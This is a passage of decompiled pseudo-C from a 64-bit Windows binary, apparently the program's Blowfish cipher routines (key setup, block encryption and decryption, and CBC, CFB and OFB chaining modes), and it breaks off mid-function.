char __fastcall sub_14008B0D0(char *a1, _BYTE *a2, int a3, __int64 a4, unsigned __int16 *a5, int *a6, int a7)
{
  int *v8; // r12
  int v9; // esi
  _BYTE *v10; // r14
  char *v11; // r15
  int v12; // ebx
  unsigned __int16 *v13; // rbp
  __int64 v14; // r15
  int v15; // edx
  int v16; // eax
  __int16 v17; // ecx^2
  char v18; // al
  int v19; // ecx
  char result; // al
  unsigned __int16 *v21; // rbp
  int v22; // edx
  int v23; // eax
  __int16 v24; // ecx^2
  char v25; // al
  int v26; // ecx
  char v27; // dl
  char v28; // cl

  v8 = a6;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v12 = *a6;
  if ( a7 )
  {
    if ( a3 )
    {
      v13 = a5;
      v14 = a1 - a2;
      do
      {
        --v9;
        if ( !v12 )
        {
          v15 = *((unsigned __int8 *)v13 + 4);
          v16 = *((unsigned __int8 *)v13 + 5);
          LODWORD(a5) = (*((unsigned __int8 *)v13 + 3) << 24) | (*((unsigned __int8 *)v13 + 2) << 16) | *v13;
          HIDWORD(a5) = (v16 << 8) | v15 | (v13[3] << 16);
          sub_14008AF80((int *)&a5, a4);
          v17 = WORD1(a5);
          *v13 = (unsigned __int16)a5;
          *((_BYTE *)v13 + 2) = v17;
          v18 = BYTE4(a5);
          *((_BYTE *)v13 + 3) = HIBYTE(v17);
          v19 = HIDWORD(a5);
          *((_BYTE *)v13 + 4) = v18;
          *((_BYTE *)v13 + 5) = BYTE1(v19);
          *((_BYTE *)v13 + 6) = BYTE2(v19);
          *((_BYTE *)v13 + 7) = HIBYTE(v19);
        }
        result = *((_BYTE *)v13 + v12) ^ v10[v14];
        *v10++ = result;
        *((_BYTE *)v13 + v12) = result;
        v12 = ((_BYTE)v12 + 1) & 7;
      }
      while ( v9 );
    }
  }
  else if ( a3 )
  {
    v21 = a5;
    do
    {
      --v9;
      if ( !v12 )
      {
        v22 = *((unsigned __int8 *)v21 + 4);
        v23 = *((unsigned __int8 *)v21 + 5);
        LODWORD(a5) = (*((unsigned __int8 *)v21 + 3) << 24) | (*((unsigned __int8 *)v21 + 2) << 16) | *v21;
        HIDWORD(a5) = (v23 << 8) | v22 | (v21[3] << 16);
        sub_14008AF80((int *)&a5, a4);
        v24 = WORD1(a5);
        *v21 = (unsigned __int16)a5;
        *((_BYTE *)v21 + 2) = v24;
        v25 = BYTE4(a5);
        *((_BYTE *)v21 + 3) = HIBYTE(v24);
        v26 = HIDWORD(a5);
        *((_BYTE *)v21 + 4) = v25;
        *((_BYTE *)v21 + 5) = BYTE1(v26);
        *((_BYTE *)v21 + 6) = BYTE2(v26);
        *((_BYTE *)v21 + 7) = HIBYTE(v26);
      }
      v27 = *v11++;
      result = v12;
      v28 = *((_BYTE *)v21 + v12);
      *((_BYTE *)v21 + v12) = v27;
      *v10++ = v28 ^ v27;
      v12 = ((_BYTE)v12 + 1) & 7;
    }
    while ( v9 );
  }
  *v8 = v12;
  return result;
}

//----- (000000014008B2F0) ----------------------------------------------------
__int64 __fastcall sub_14008B2F0(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6)
{
  int *v7; // r13
  int v8; // ecx
  int v10; // edx
  int v11; // r14d
  int v12; // r10d
  int v13; // ebx
  int v14; // r15d
  int v15; // r10d
  int v16; // r10d
  int v17; // edx
  int v18; // ecx
  unsigned int v19; // edx
  __int64 result; // rax
  __int64 v21; // r13
  __int64 v22; // r12
  unsigned __int8 v23; // r8
  unsigned __int8 v24; // r9
  int v25; // [rsp+20h] [rbp-40h] BYREF
  unsigned int v26; // [rsp+24h] [rbp-3Ch]
  __int64 v27; // [rsp+28h] [rbp-38h]
  int *v28; // [rsp+30h] [rbp-30h]
  unsigned __int8 *v29; // [rsp+38h] [rbp-28h]
  int v30; // [rsp+40h] [rbp-20h]
  unsigned int v31; // [rsp+44h] [rbp-1Ch]

  v7 = a6;
  v8 = a5[7];
  v10 = a5[4];
  v11 = a3;
  v12 = *a5;
  v13 = *a6;
  v14 = 0;
  v29 = a5;
  v15 = (a5[2] << 16) | (a5[1] << 8) | v12;
  v27 = a4;
  v16 = (a5[3] << 24) | v15;
  v28 = a6;
  v17 = (a5[5] << 8) | v10;
  v25 = v16;
  v18 = a5[6] | (v8 << 8);
  v30 = v16;
  v19 = (v18 << 16) | v17;
  v31 = v19;
  result = HIBYTE(v19);
  v26 = v19;
  if ( a3 )
  {
    v21 = v27;
    v22 = a2 - (_QWORD)a1;
    v23 = v19;
    v24 = v16;
    do
    {
      --v11;
      if ( !v13 )
      {
        sub_14008AF80(&v25, v21);
        v16 = v25;
        v19 = v26;
        v24 = v25;
        v23 = v26;
        ++v14;
        v30 = v25;
        v31 = v26;
      }
      result = v13;
      a1[v22] = *a1 ^ *((_BYTE *)&v30 + v13);
      ++a1;
      v13 = ((_BYTE)v13 + 1) & 7;
    }
    while ( v11 );
    v7 = v28;
    if ( v14 )
    {
      *v29 = v24;
      a5[1] = BYTE1(v16);
      a5[2] = BYTE2(v16);
      a5[3] = HIBYTE(v16);
      a5[4] = v23;
      a5[5] = BYTE1(v19);
      result = HIWORD(v19);
      a5[6] = BYTE2(v19);
      a5[7] = HIBYTE(v19);
    }
  }
  *v7 = v13;
  return result;
}

//----- (000000014008B4D0) ----------------------------------------------------
__int64 __fastcall sub_14008B4D0(_DWORD *a1, int a2, unsigned __int8 *a3)
{
  _OWORD *v4; // rax
  _DWORD *v6; // r9
  __int64 v8; // rcx
  __int128 v9; // xmm0
  unsigned __int8 *v10; // rdx
  __int64 v11; // rcx
  int v12; // eax
  unsigned __int64 v13; // r8
  __int64 v14; // rbx
  __int64 i; // r9
  int v16; // ecx
  unsigned __int8 *v17; // rdx
  int v18; // eax
  unsigned __int8 *v19; // rdx
  int v20; // ecx
  int v21; // eax
  unsigned __int8 *v22; // rdx
  int v23; // ecx
  int v24; // eax
  int v25; // ecx
  __int64 j; // rsi
  __int64 result; // rax
  __int64 v28; // [rsp+30h] [rbp+8h] BYREF

  v4 = &unk_1401130C0;
  v6 = a1;
  v8 = 32i64;
  do
  {
    v6 += 32;
    v9 = *v4;
    v4 += 8;
    *((_OWORD *)v6 - 8) = v9;
    *((_OWORD *)v6 - 7) = *(v4 - 7);
    *((_OWORD *)v6 - 6) = *(v4 - 6);
    *((_OWORD *)v6 - 5) = *(v4 - 5);
    *((_OWORD *)v6 - 4) = *(v4 - 4);
    *((_OWORD *)v6 - 3) = *(v4 - 3);
    *((_OWORD *)v6 - 2) = *(v4 - 2);
    *((_OWORD *)v6 - 1) = *(v4 - 1);
    --v8;
  }
  while ( v8 );
  v10 = a3;
  *(_OWORD *)v6 = *v4;
  *((_OWORD *)v6 + 1) = v4[1];
  *((_OWORD *)v6 + 2) = v4[2];
  *((_OWORD *)v6 + 3) = v4[3];
  v11 = *((_QWORD *)v4 + 8);
  v12 = 72;
  *((_QWORD *)v6 + 8) = v11;
  if ( a2 <= 72 )
    v12 = a2;
  v13 = (unsigned __int64)&a3[v12];
  v14 = 0i64;
  for ( i = 0i64; i < 18; ++i )
  {
    v16 = *v10;
    v17 = v10 + 1;
    if ( (unsigned __int64)v17 >= v13 )
      v17 = a3;
    v18 = *v17;
    v19 = v17 + 1;
    v20 = v18 | (v16 << 8);
    if ( (unsigned __int64)v19 >= v13 )
      v19 = a3;
    v21 = *v19;
    v22 = v19 + 1;
    v23 = v21 | (v20 << 8);
    if ( (unsigned __int64)v22 >= v13 )
      v22 = a3;
    v24 = *v22;
    v10 = v22 + 1;
    v25 = v24 | (v23 << 8);
    if ( (unsigned __int64)v10 >= v13 )
      v10 = a3;
    a1[i] ^= v25;
  }
  v28 = 0i64;
  for ( j = 0i64; j < 18; j += 2i64 )
  {
    sub_14008C150((unsigned int *)&v28, a1);
    *(_QWORD *)&a1[j] = v28;
  }
  do
  {
    sub_14008C150((unsigned int *)&v28, a1);
    a1[v14 + 18] = v28;
    result = HIDWORD(v28);
    a1[v14 + 19] = HIDWORD(v28);
    v14 += 2i64;
  }
  while ( v14 < 1024 );
  return result;
}

//----- (000000014008B670) ----------------------------------------------------
__int64 __fastcall sub_14008B670(__int64 a1, _BYTE *a2, _DWORD *a3, int a4)
{
  int v6; // edx
  unsigned int v7; // r10d
  int v8; // eax
  int v9; // ecx
  unsigned int v10; // ecx
  char v11; // al
  int v12; // ecx
  __int64 result; // rax
  unsigned int v14; // [rsp+30h] [rbp+8h] BYREF
  int v15; // [rsp+34h] [rbp+Ch]

  v6 = *(unsigned __int8 *)(a1 + 4) << 24;
  v7 = _byteswap_ulong(*(_DWORD *)a1);
  v8 = *(unsigned __int8 *)(a1 + 5);
  v9 = *(unsigned __int8 *)(a1 + 6) << 8;
  v14 = v7;
  v15 = (v8 << 16) | v6 | *(unsigned __int8 *)(a1 + 7) | v9;
  if ( a4 )
    sub_14008C150(&v14, a3);
  else
    sub_14008BCB0(&v14, a3);
  v10 = v14;
  *a2 = HIBYTE(v14);
  a2[1] = BYTE2(v10);
  v11 = v14;
  a2[2] = BYTE1(v10);
  v12 = v15;
  a2[3] = v11;
  a2[4] = HIBYTE(v12);
  a2[5] = BYTE2(v12);
  result = (unsigned __int8)v15;
  a2[6] = BYTE1(v12);
  a2[7] = result;
  return result;
}

//----- (000000014008B740) ----------------------------------------------------
__int64 __fastcall sub_14008B740(__int64 a1, _BYTE *a2, unsigned int a3, _DWORD *a4, unsigned int *a5, int a6)
{
  unsigned int *v9; // rdi
  unsigned int v10; // esi
  unsigned int v11; // r10d
  unsigned int v12; // r8d
  unsigned __int64 v13; // r15
  int v14; // ecx
  int v15; // ecx
  __int64 v16; // r14
  int v17; // ecx
  int v18; // edx
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  __int64 result; // rax
  unsigned int *v25; // r15
  int v26; // edi
  unsigned int v27; // r12d
  unsigned int v28; // r13d
  unsigned __int64 v29; // r15
  unsigned int v30; // esi
  int v31; // edi
  int v32; // edi
  unsigned int v33; // ecx
  int v34; // edx
  char v35; // eax^3
  int v36; // ecx
  unsigned int v37; // esi
  int v38; // edx
  unsigned int v39; // edx
  int v40; // r8d
  _BYTE *v41; // rbx
  unsigned int v42; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v43; // [rsp+24h] [rbp-Ch]
  unsigned int *v44; // [rsp+28h] [rbp-8h]
  _DWORD *v45; // [rsp+78h] [rbp+48h]
  int v46; // [rsp+88h] [rbp+58h]
  int v47; // [rsp+88h] [rbp+58h]

  v45 = a4;
  if ( a6 )
  {
    v9 = a5;
    v10 = a3 - 8;
    v44 = a5;
    v11 = _byteswap_ulong(*a5);
    v12 = _byteswap_ulong(a5[1]);
    if ( (int)(a3 - 8) >= 0 )
    {
      v13 = (unsigned __int64)(v10 + 8) >> 3;
      v10 -= 8 * ((v10 + 8) >> 3);
      do
      {
        v14 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
        v42 = v11 ^ _byteswap_ulong(*(_DWORD *)a1);
        v15 = *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8) | v14;
        a1 += 8i64;
        v43 = v12 ^ v15;
        sub_14008C150(&v42, v45);
        v11 = v42;
        v12 = v43;
        *a2 = HIBYTE(v42);
        a2[1] = BYTE2(v11);
        a2[2] = BYTE1(v11);
        a2[3] = v11;
        a2[4] = HIBYTE(v12);
        a2[5] = BYTE2(v12);
        a2[6] = BYTE1(v12);
        a2[7] = v12;
        a2 += 8;
        --v13;
      }
      while ( v13 );
      v9 = v44;
    }
    if ( v10 != -8 )
    {
      v16 = (int)(v10 + 8) + a1;
      v17 = 0;
      v18 = 0;
      switch ( v10 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v17 = *(unsigned __int8 *)--v16;
LABEL_9:
          v19 = *(unsigned __int8 *)--v16;
          v17 |= v19 << 8;
LABEL_10:
          v20 = *(unsigned __int8 *)--v16;
          v17 |= v20 << 16;
LABEL_11:
          v21 = *(unsigned __int8 *)--v16;
          v17 |= v21 << 24;
LABEL_12:
          v18 = *(unsigned __int8 *)--v16;
LABEL_13:
          v22 = *(unsigned __int8 *)--v16;
          v18 |= v22 << 8;
LABEL_14:
          v23 = *(unsigned __int8 *)--v16;
          v18 |= v23 << 16;
LABEL_15:
          v18 |= *(unsigned __int8 *)(v16 - 1) << 24;
          break;
        default:
          break;
      }
      v42 = v11 ^ v18;
      v43 = v12 ^ v17;
      sub_14008C150(&v42, v45);
      v11 = v42;
      v12 = v43;
      *a2 = HIBYTE(v42);
      a2[1] = BYTE2(v11);
      a2[2] = BYTE1(v11);
      a2[3] = v11;
      a2[4] = HIBYTE(v12);
      a2[5] = BYTE2(v12);
      a2[6] = BYTE1(v12);
      a2[7] = v12;
    }
    *(_BYTE *)v9 = HIBYTE(v11);
    *((_BYTE *)v9 + 1) = BYTE2(v11);
    *((_BYTE *)v9 + 2) = BYTE1(v11);
    *((_BYTE *)v9 + 3) = v11;
    *((_BYTE *)v9 + 4) = HIBYTE(v12);
    *((_BYTE *)v9 + 5) = BYTE2(v12);
    result = v12 >> 8;
    *((_BYTE *)v9 + 6) = BYTE1(v12);
    *((_BYTE *)v9 + 7) = v12;
  }
  else
  {
    v25 = a5;
    v26 = a3 - 8;
    v44 = a5;
    v27 = _byteswap_ulong(*a5);
    v28 = _byteswap_ulong(a5[1]);
    if ( (int)(a3 - 8) >= 0 )
    {
      v29 = (unsigned __int64)a3 >> 3;
      v46 = a3 - 8 - 8 * (a3 >> 3);
      do
      {
        v30 = _byteswap_ulong(*(_DWORD *)a1);
        v31 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
        v42 = v30;
        v32 = *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8) | v31;
        a1 += 8i64;
        v43 = v32;
        sub_14008BCB0(&v42, a4);
        v33 = v27 ^ v42;
        a4 = v45;
        v34 = v28 ^ v43;
        v35 = HIBYTE(v27) ^ HIBYTE(v42);
        v27 = v30;
        v28 = v32;
        *a2 = v35;
        a2[1] = BYTE2(v33);
        a2[2] = BYTE1(v33);
        a2[3] = v33;
        a2[4] = HIBYTE(v34);
        a2[5] = BYTE2(v34);
        a2[6] = BYTE1(v34);
        a2[7] = v34;
        a2 += 8;
        --v29;
      }
      while ( v29 );
      v25 = v44;
      v26 = v46;
    }
    if ( v26 != -8 )
    {
      v36 = *(unsigned __int8 *)(a1 + 6) << 8;
      v37 = _byteswap_ulong(*(_DWORD *)a1);
      v38 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
      v42 = v37;
      v47 = *(unsigned __int8 *)(a1 + 7) | v36 | v38;
      v43 = v47;
      sub_14008BCB0(&v42, a4);
      v39 = v27 ^ v42;
      v40 = v28 ^ v43;
      v41 = &a2[v26 + 8];
      switch ( v26 )
      {
        case -7:
          goto LABEL_31;
        case -6:
          goto LABEL_30;
        case -5:
          goto LABEL_29;
        case -4:
          goto LABEL_28;
        case -3:
          goto LABEL_27;
        case -2:
          goto LABEL_26;
        case -1:
          goto LABEL_25;
        case 0:
          *--v41 = v40;
LABEL_25:
          *--v41 = BYTE1(v40);
LABEL_26:
          *--v41 = BYTE2(v40);
LABEL_27:
          *--v41 = HIBYTE(v40);
LABEL_28:
          *--v41 = v39;
LABEL_29:
          *--v41 = BYTE1(v39);
LABEL_30:
          *--v41 = BYTE2(v39);
LABEL_31:
          *(v41 - 1) = HIBYTE(v39);
          break;
        default:
          break;
      }
      v28 = v47;
      v27 = v37;
    }
    *(_BYTE *)v25 = HIBYTE(v27);
    *((_BYTE *)v25 + 1) = BYTE2(v27);
    *((_BYTE *)v25 + 2) = BYTE1(v27);
    *((_BYTE *)v25 + 3) = v27;
    *((_BYTE *)v25 + 4) = HIBYTE(v28);
    *((_BYTE *)v25 + 5) = BYTE2(v28);
    result = v28 >> 8;
    *((_BYTE *)v25 + 6) = BYTE1(v28);
    *((_BYTE *)v25 + 7) = v28;
  }
  return result;
}

//----- (000000014008BCB0) ----------------------------------------------------
__int64 __fastcall sub_14008BCB0(unsigned int *a1, _DWORD *a2)
{
  unsigned int v3; // r9d
  unsigned int v4; // r8d
  unsigned int v5; // r9d
  unsigned int v6; // r8d
  unsigned int v7; // r9d
  unsigned int v8; // r8d
  unsigned int v9; // r9d
  unsigned int v10; // r8d
  unsigned int v11; // r9d
  unsigned int v12; // r8d
  unsigned int v13; // r9d
  unsigned int v14; // r8d
  unsigned int v15; // r9d
  unsigned int v16; // r8d
  unsigned int v17; // r9d
  unsigned int v18; // r8d
  __int64 result; // rax
  int v20; // r9d

  v3 = *a1 ^ a2[17];
  v4 = a1[1] ^ a2[16] ^ (a2[(unsigned __int8)v3 + 786]
                       + (a2[BYTE1(v3) + 530] ^ (a2[((unsigned __int64)v3 >> 24) + 18] + a2[BYTE2(v3) + 274])));
  v5 = a2[15] ^ (a2[(unsigned __int8)v4 + 786]
               + (a2[BYTE1(v4) + 530] ^ (a2[((unsigned __int64)v4 >> 24) + 18] + a2[BYTE2(v4) + 274]))) ^ v3;
  v6 = a2[14] ^ (a2[(unsigned __int8)v5 + 786]
               + (a2[BYTE1(v5) + 530] ^ (a2[((unsigned __int64)v5 >> 24) + 18] + a2[BYTE2(v5) + 274]))) ^ v4;
  v7 = a2[13] ^ (a2[(unsigned __int8)v6 + 786]
               + (a2[BYTE1(v6) + 530] ^ (a2[((unsigned __int64)v6 >> 24) + 18] + a2[BYTE2(v6) + 274]))) ^ v5;
  v8 = a2[12] ^ (a2[(unsigned __int8)v7 + 786]
               + (a2[BYTE1(v7) + 530] ^ (a2[((unsigned __int64)v7 >> 24) + 18] + a2[BYTE2(v7) + 274]))) ^ v6;
  v9 = a2[11] ^ (a2[(unsigned __int8)v8 + 786]
               + (a2[BYTE1(v8) + 530] ^ (a2[((unsigned __int64)v8 >> 24) + 18] + a2[BYTE2(v8) + 274]))) ^ v7;
  v10 = a2[10] ^ (a2[(unsigned __int8)v9 + 786]
                + (a2[BYTE1(v9) + 530] ^ (a2[((unsigned __int64)v9 >> 24) + 18] + a2[BYTE2(v9) + 274]))) ^ v8;
  v11 = a2[9] ^ (a2[(unsigned __int8)v10 + 786]
               + (a2[BYTE1(v10) + 530] ^ (a2[((unsigned __int64)v10 >> 24) + 18] + a2[BYTE2(v10) + 274]))) ^ v9;
  v12 = a2[8] ^ (a2[(unsigned __int8)v11 + 786]
               + (a2[BYTE1(v11) + 530] ^ (a2[((unsigned __int64)v11 >> 24) + 18] + a2[BYTE2(v11) + 274]))) ^ v10;
  v13 = a2[7] ^ (a2[(unsigned __int8)v12 + 786]
               + (a2[BYTE1(v12) + 530] ^ (a2[((unsigned __int64)v12 >> 24) + 18] + a2[BYTE2(v12) + 274]))) ^ v11;
  v14 = a2[6] ^ (a2[(unsigned __int8)v13 + 786]
               + (a2[BYTE1(v13) + 530] ^ (a2[((unsigned __int64)v13 >> 24) + 18] + a2[BYTE2(v13) + 274]))) ^ v12;
  v15 = a2[5] ^ (a2[(unsigned __int8)v14 + 786]
               + (a2[BYTE1(v14) + 530] ^ (a2[((unsigned __int64)v14 >> 24) + 18] + a2[BYTE2(v14) + 274]))) ^ v13;
  v16 = a2[4] ^ (a2[(unsigned __int8)v15 + 786]
               + (a2[BYTE1(v15) + 530] ^ (a2[((unsigned __int64)v15 >> 24) + 18] + a2[BYTE2(v15) + 274]))) ^ v14;
  v17 = a2[3] ^ (a2[(unsigned __int8)v16 + 786]
               + (a2[BYTE1(v16) + 530] ^ (a2[((unsigned __int64)v16 >> 24) + 18] + a2[BYTE2(v16) + 274]))) ^ v15;
  v18 = a2[2] ^ (a2[(unsigned __int8)v17 + 786]
               + (a2[BYTE1(v17) + 530] ^ (a2[((unsigned __int64)v17 >> 24) + 18] + a2[BYTE2(v17) + 274]))) ^ v16;
  result = (unsigned int)(unsigned __int8)v18 + 768;
  v20 = a2[1] ^ (a2[result + 18]
               + (a2[BYTE1(v18) + 530] ^ (a2[((unsigned __int64)v18 >> 24) + 18] + a2[BYTE2(v18) + 274]))) ^ v17;
  *a1 = *a2 ^ v18;
  a1[1] = v20;
  return result;
}

//----- (000000014008C150) ----------------------------------------------------
__int64 __fastcall sub_14008C150(unsigned int *a1, _DWORD *a2)
{
  unsigned int v3; // r9d
  unsigned int v4; // r8d
  unsigned int v5; // r9d
  unsigned int v6; // r8d
  unsigned int v7; // r9d
  unsigned int v8; // r8d
  unsigned int v9; // r9d
  unsigned int v10; // r8d
  unsigned int v11; // r9d
  unsigned int v12; // r8d
  unsigned int v13; // r9d
  unsigned int v14; // r8d
  unsigned int v15; // r9d
  unsigned int v16; // r8d
  unsigned int v17; // r9d
  unsigned int v18; // r8d
  __int64 result; // rax
  int v20; // r9d

  v3 = *a2 ^ *a1;
  v4 = a1[1] ^ a2[1] ^ (a2[(unsigned __int8)v3 + 786]
                      + (a2[BYTE1(v3) + 530] ^ (a2[((unsigned __int64)v3 >> 24) + 18] + a2[BYTE2(v3) + 274])));
  v5 = a2[2] ^ (a2[(unsigned __int8)v4 + 786]
              + (a2[BYTE1(v4) + 530] ^ (a2[((unsigned __int64)v4 >> 24) + 18] + a2[BYTE2(v4) + 274]))) ^ v3;
  v6 = a2[3] ^ (a2[(unsigned __int8)v5 + 786]
              + (a2[BYTE1(v5) + 530] ^ (a2[((unsigned __int64)v5 >> 24) + 18] + a2[BYTE2(v5) + 274]))) ^ v4;
  v7 = a2[4] ^ (a2[(unsigned __int8)v6 + 786]
              + (a2[BYTE1(v6) + 530] ^ (a2[((unsigned __int64)v6 >> 24) + 18] + a2[BYTE2(v6) + 274]))) ^ v5;
  v8 = a2[5] ^ (a2[(unsigned __int8)v7 + 786]
              + (a2[BYTE1(v7) + 530] ^ (a2[((unsigned __int64)v7 >> 24) + 18] + a2[BYTE2(v7) + 274]))) ^ v6;
  v9 = a2[6] ^ (a2[(unsigned __int8)v8 + 786]
              + (a2[BYTE1(v8) + 530] ^ (a2[((unsigned __int64)v8 >> 24) + 18] + a2[BYTE2(v8) + 274]))) ^ v7;
  v10 = a2[7] ^ (a2[(unsigned __int8)v9 + 786]
               + (a2[BYTE1(v9) + 530] ^ (a2[((unsigned __int64)v9 >> 24) + 18] + a2[BYTE2(v9) + 274]))) ^ v8;
  v11 = a2[8] ^ (a2[(unsigned __int8)v10 + 786]
               + (a2[BYTE1(v10) + 530] ^ (a2[((unsigned __int64)v10 >> 24) + 18] + a2[BYTE2(v10) + 274]))) ^ v9;
  v12 = a2[9] ^ (a2[(unsigned __int8)v11 + 786]
               + (a2[BYTE1(v11) + 530] ^ (a2[((unsigned __int64)v11 >> 24) + 18] + a2[BYTE2(v11) + 274]))) ^ v10;
  v13 = a2[10] ^ (a2[(unsigned __int8)v12 + 786]
                + (a2[BYTE1(v12) + 530] ^ (a2[((unsigned __int64)v12 >> 24) + 18] + a2[BYTE2(v12) + 274]))) ^ v11;
  v14 = a2[11] ^ (a2[(unsigned __int8)v13 + 786]
                + (a2[BYTE1(v13) + 530] ^ (a2[((unsigned __int64)v13 >> 24) + 18] + a2[BYTE2(v13) + 274]))) ^ v12;
  v15 = a2[12] ^ (a2[(unsigned __int8)v14 + 786]
                + (a2[BYTE1(v14) + 530] ^ (a2[((unsigned __int64)v14 >> 24) + 18] + a2[BYTE2(v14) + 274]))) ^ v13;
  v16 = a2[13] ^ (a2[(unsigned __int8)v15 + 786]
                + (a2[BYTE1(v15) + 530] ^ (a2[((unsigned __int64)v15 >> 24) + 18] + a2[BYTE2(v15) + 274]))) ^ v14;
  v17 = a2[14] ^ (a2[(unsigned __int8)v16 + 786]
                + (a2[BYTE1(v16) + 530] ^ (a2[((unsigned __int64)v16 >> 24) + 18] + a2[BYTE2(v16) + 274]))) ^ v15;
  v18 = a2[15] ^ (a2[(unsigned __int8)v17 + 786]
                + (a2[BYTE1(v17) + 530] ^ (a2[((unsigned __int64)v17 >> 24) + 18] + a2[BYTE2(v17) + 274]))) ^ v16;
  result = (unsigned int)(unsigned __int8)v18 + 768;
  v20 = a2[16] ^ (a2[result + 18]
                + (a2[BYTE1(v18) + 530] ^ (a2[((unsigned __int64)v18 >> 24) + 18] + a2[BYTE2(v18) + 274]))) ^ v17;
  *a1 = a2[17] ^ v18;
  a1[1] = v20;
  return result;
}

//----- (000000014008C5F0) ----------------------------------------------------
unsigned __int8 __fastcall sub_14008C5F0(
        unsigned __int8 *a1,
        unsigned __int8 *a2,
        int a3,
        _DWORD *a4,
        unsigned __int8 *a5,
        int *a6,
        int a7)
{
  int *v8; // r12
  int v9; // esi
  unsigned __int8 *v10; // r14
  unsigned __int8 *v11; // r15
  int v12; // ebx
  unsigned __int8 *v13; // rbp
  __int64 v14; // r15
  int v15; // edx
  int v16; // eax
  int v17; // ecx
  unsigned __int8 v18; // al
  int v19; // ecx
  unsigned __int8 v20; // al
  unsigned __int8 result; // al
  unsigned __int8 *v22; // rbp
  int v23; // edx
  int v24; // eax
  int v25; // ecx
  unsigned __int8 v26; // al
  int v27; // ecx
  unsigned __int8 v28; // al
  unsigned __int8 v29; // dl
  unsigned __int8 v30; // cl

  v8 = a6;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v12 = *a6;
  if ( a7 )
  {
    if ( a3 )
    {
      v13 = a5;
      v14 = a1 - a2;
      do
      {
        --v9;
        if ( !v12 )
        {
          v15 = v13[4] << 24;
          v16 = v13[5];
          LODWORD(a5) = v13[3] | (v13[2] << 8) | ((v13[1] | (*v13 << 8)) << 16);
          HIDWORD(a5) = (v16 << 16) | v15 | v13[7] | (v13[6] << 8);
          sub_14008C150((unsigned int *)&a5, a4);
          v17 = (int)a5;
          *v13 = BYTE3(a5);
          v13[1] = BYTE2(v17);
          v18 = (unsigned __int8)a5;
          v13[2] = BYTE1(v17);
          v19 = HIDWORD(a5);
          v13[3] = v18;
          v13[4] = HIBYTE(v19);
          v13[5] = BYTE2(v19);
          v20 = BYTE4(a5);
          v13[6] = BYTE1(v19);
          v13[7] = v20;
        }
        result = v13[v12] ^ v10[v14];
        *v10++ = result;
        v13[v12] = result;
        v12 = ((_BYTE)v12 + 1) & 7;
      }
      while ( v9 );
    }
  }
  else if ( a3 )
  {
    v22 = a5;
    do
    {
      --v9;
      if ( !v12 )
      {
        v23 = v22[4] << 24;
        v24 = v22[5];
        LODWORD(a5) = v22[3] | (v22[2] << 8) | ((v22[1] | (*v22 << 8)) << 16);
        HIDWORD(a5) = (v24 << 16) | v23 | v22[7] | (v22[6] << 8);
        sub_14008C150((unsigned int *)&a5, a4);
        v25 = (int)a5;
        *v22 = BYTE3(a5);
        v22[1] = BYTE2(v25);
        v26 = (unsigned __int8)a5;
        v22[2] = BYTE1(v25);
        v27 = HIDWORD(a5);
        v22[3] = v26;
        v22[4] = HIBYTE(v27);
        v22[5] = BYTE2(v27);
        v28 = BYTE4(a5);
        v22[6] = BYTE1(v27);
        v22[7] = v28;
      }
      v29 = *v11++;
      result = v12;
      v30 = v22[v12];
      v22[v12] = v29;
      *v10++ = v30 ^ v29;
      v12 = ((_BYTE)v12 + 1) & 7;
    }
    while ( v9 );
  }
  *v8 = v12;
  return result;
}

//----- (000000014008C810) ----------------------------------------------------
__int64 __fastcall sub_14008C810(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6)
{
  int v7; // r8d
  int *v8; // r13
  int v10; // ecx
  int v11; // r10d
  int v12; // r15d
  int v13; // ebx
  int v14; // r10d
  int v15; // r8d
  int v16; // ecx
  unsigned int v17; // r8d
  __int64 result; // rax
  _DWORD *v19; // r13
  __int64 v20; // r12
  unsigned __int8 v21; // dl
  unsigned __int8 v22; // r9
  int v23; // [rsp+20h] [rbp-40h] BYREF
  unsigned int v24; // [rsp+24h] [rbp-3Ch]
  _DWORD *v25; // [rsp+28h] [rbp-38h]
  int *v26; // [rsp+30h] [rbp-30h]
  unsigned __int8 *v27; // [rsp+38h] [rbp-28h]
  char v28; // [rsp+40h] [rbp-20h]
  char v29; // [rsp+41h] [rbp-1Fh]
  char v30; // [rsp+42h] [rbp-1Eh]
  char v31; // [rsp+43h] [rbp-1Dh]
  char v32; // [rsp+44h] [rbp-1Ch]
  char v33; // [rsp+45h] [rbp-1Bh]
  char v34; // [rsp+46h] [rbp-1Ah]
  char v35; // [rsp+47h] [rbp-19h]

  v7 = a5[4];
  v8 = a6;
  v10 = a5[6];
  v11 = *a5;
  v27 = a5;
  v12 = 0;
  v13 = *a6;
  v14 = a5[3] | (a5[2] << 8) | (a5[1] << 16) | (v11 << 24);
  v25 = (_DWORD *)a4;
  v15 = (a5[5] << 16) | (v7 << 24);
  v26 = a6;
  v16 = a5[7] | (v10 << 8);
  v23 = v14;
  v17 = v16 | v15;
  v31 = v14;
  v24 = v17;
  v28 = HIBYTE(v14);
  v29 = BYTE2(v14);
  v30 = BYTE1(v14);
  v32 = HIBYTE(v17);
  v33 = BYTE2(v17);
  result = v17 >> 8;
  v34 = BYTE1(v17);
  v35 = v17;
  if ( a3 )
  {
    v19 = v25;
    v20 = a2 - (_QWORD)a1;
    v21 = v17;
    v22 = v14;
    do
    {
      --a3;
      if ( !v13 )
      {
        sub_14008C150((unsigned int *)&v23, v19);
        v14 = v23;
        v17 = v24;
        v22 = v23;
        v21 = v24;
        v28 = HIBYTE(v23);
